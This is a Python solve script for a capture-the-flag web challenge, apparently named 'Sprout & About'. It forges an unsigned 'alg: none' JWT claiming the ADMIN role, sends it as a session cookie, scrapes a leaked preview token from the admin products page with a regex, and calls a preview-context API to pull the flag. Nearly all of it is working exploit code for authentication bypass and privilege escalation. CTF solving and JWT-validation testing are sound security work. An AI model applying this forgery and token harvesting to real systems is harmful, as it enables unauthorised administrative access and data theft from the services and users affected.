"""
Sprout & About — CTF Solve Script
==================================
Exploits:
  1. JWT "alg: none" signature bypass  →  privilege escalation to ADMIN
  2. Leaked preview token in /admin/products  →  direct flag exfiltration
     via /api/admin/preview-context
"""

import requests
import json
import base64
import re
import sys

BASE_URL = "https://sprout-about-7565d8f9d6ef.chals.z0d1ak.org"


# ── helpers ──────────────────────────────────────────────────────────
def b64url_encode(data: str) -> str:
    """Base64-URL encode without padding."""
    return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()


def forge_admin_jwt() -> str:
    """Build an unsigned JWT (alg=none) with role=ADMIN."""
    header  = json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":"))
    payload = json.dumps({
        "sub":   "1",
        "email": "pwned@sproutabout.com",
        "role":  "ADMIN",
        "iat":   1787442464,
        "exp":   1887464064,
    }, separators=(",", ":"))
    return f"{b64url_encode(header)}.{b64url_encode(payload)}."


# ── step 1: forge admin token ────────────────────────────────────────
print("[*] Forging alg=none ADMIN JWT …")
admin_token = forge_admin_jwt()
cookies = {"sprout_session": admin_token}
print(f"[+] Token: {admin_token[:60]}…")

# ── step 2: fetch product catalog & extract first preview token ──────
print("[*] Fetching /admin/products …")
resp = requests.get(f"{BASE_URL}/admin/products", cookies=cookies)
assert resp.status_code == 200, f"Unexpected status {resp.status_code}"

# The React SSR payload embeds ProductPreviewDialog props like:
#   "productId":1,"previewToken":"<uuid>","name":"Moonlit Kelp"
matches = re.findall(
    r'"productId"\s*:\s*(\d+)\s*,\s*"previewToken"\s*:\s*"([^"]+)"',
    resp.text,
)
assert matches, "Could not find any preview tokens in page source"
product_id, preview_token = matches[0]
print(f"[+] Found productId={product_id}  previewToken={preview_token}")

# ── step 3: hit the preview-context API to get the flag ──────────────
print("[*] Requesting /api/admin/preview-context …")
ctx = requests.get(
    f"{BASE_URL}/api/admin/preview-context",
    params={"productId": product_id, "previewToken": preview_token},
    cookies=cookies,
)
data = ctx.json()
flag = data.get("finalFlag", "FLAG NOT FOUND")

print()
print("=" * 52)
print(f"  🚩  FLAG: {flag}")
print("=" * 52)
